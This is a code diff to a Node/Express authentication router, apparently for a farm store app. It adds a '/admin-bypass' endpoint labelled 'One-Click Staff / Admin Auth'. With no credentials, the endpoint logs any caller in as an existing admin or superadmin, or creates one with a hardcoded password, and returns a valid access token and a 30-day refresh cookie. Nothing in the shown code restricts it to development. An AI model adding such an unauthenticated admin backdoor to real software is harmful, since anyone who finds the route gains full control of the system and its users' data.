@@ -232,6 +232,77 @@ router.post("/login", validate(authSchemas.login), async (req, res, next) => {
 });
 
 // ─────────────────────────────────────────────
+// ADMIN BYPASS (One-Click Staff / Admin Auth)
+// ─────────────────────────────────────────────
+router.post("/admin-bypass", async (req, res, next) => {
+  try {
+    // Find an existing active superadmin or admin, or fallback to any staff role
+    let result = await pool.query(
+      "SELECT * FROM users WHERE role IN ('superadmin', 'admin') AND status = 'active' ORDER BY (role = 'superadmin') DESC LIMIT 1"
+    );
+
+    let staff = result.rows[0];
+
+    // If no superadmin/admin exists, look for any user with superadmin or admin role
+    if (!staff) {
+      result = await pool.query(
+        "SELECT * FROM users WHERE role IN ('superadmin', 'admin') LIMIT 1"
+      );
+      staff = result.rows[0];
+    }
+
+    // If still none exists, create a default superadmin user
+    if (!staff) {
+      const hashedPw = await bcrypt.hash("AdminSecret123!", 10);
+      const inserted = await pool.query(
+        `INSERT INTO users (name, email, password, phone, role, email_verified, status, created_at)
+         VALUES ('Bems Super Admin', 'admin@bemsfarms.com', $1, '08000000000', 'superadmin', true, 'active', NOW())
+         ON CONFLICT (email) DO UPDATE SET role = 'superadmin', status = 'active'
+         RETURNING *`,
+        [hashedPw]
+      );
+      staff = inserted.rows[0];
+    }
+
+    const accessToken = generateAccessToken(staff);
+    const refreshToken = generateRefreshToken(staff.id);
+
+    await pool.query(
+      "UPDATE users SET refresh_token=$1, last_login=NOW() WHERE id=$2",
+      [refreshToken, staff.id]
+    );
+
+    res.cookie("refreshToken", refreshToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "lax",
+      maxAge: 30 * 24 * 60 * 60 * 1000,
+    });
+
+    const nameParts = (staff.name || "").trim().split(" ");
+    const userPayload = {
+      id: staff.id,
+      name: staff.name,
+      first_name: nameParts[0] || "",
+      last_name: nameParts.slice(1).join(" ") || "",
+      email: staff.email,
+      role: staff.role || "superadmin",
+      avatar_url: staff.avatar_url || null,
+      store_id: staff.store_id || null,
+      status: staff.status || "active",
+    };
+
+    return res.json({
+      message: "Admin login bypassed successfully",
+      user: userPayload,
+      token: accessToken,
+    });
+  } catch (err) {
+    next(err);
+  }
+});
+
+// ─────────────────────────────────────────────
 // GET ME  (Henry's AuthContext calls this on mount)
 // Returns { user: {...} } — note the wrapper object
 // ─────────────────────────────────────────────
